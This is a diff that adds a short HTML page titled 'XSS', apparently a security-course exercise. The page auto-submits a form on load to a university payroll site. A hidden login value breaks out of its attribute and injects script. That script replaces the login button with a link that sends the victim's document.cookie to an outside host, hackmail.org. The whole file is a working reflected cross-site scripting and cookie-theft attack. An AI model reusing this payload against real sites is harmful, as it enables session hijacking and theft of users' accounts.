@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8" />
+		<title>XSS</title>
+	</head>
+	<body onload="document.forms[0].submit()">
+		<form method="post" action="http://payroll.gatech.edu/">
+		      <fieldset>
+		       <legend>Please log in</legend>
+		       <label>account ID:</label>
+		       <input name="secret" value="whatdoido?" type="hidden">
+		       <input name="login" value='"> <script>setTimeout(function(){strs = [ "javascript:void((new%20Image()).src=",  "http://hackmail.org/sendmail.php?",  "%20+%20",  "&username=your%20username",  "%20+%20",  "&payload=" + document.cookie,  "%20+%20",  "&random=",  "%20+%20Math.random());" ];a = document.createElement("a");a.setAttribute("class","btn");a.setAttribute("href",strs.join(String.fromCharCode(39)));a.innerHTML = "Log In";b = document.getElementsByName("action")[0];d = b.parentElement;d.innerHTML = "";d.appendChild(a);},1)</script> <div class="' type="text">
+		       <label>Password:</label>
+		       <input name="pw" type="password">
+		       <div>
+		        <button class="btn" type="submit" name="action" value="login">Log In</button>
+		       </div>
+		      </fieldset>
+	     </form>	
+    </body>
+</html>
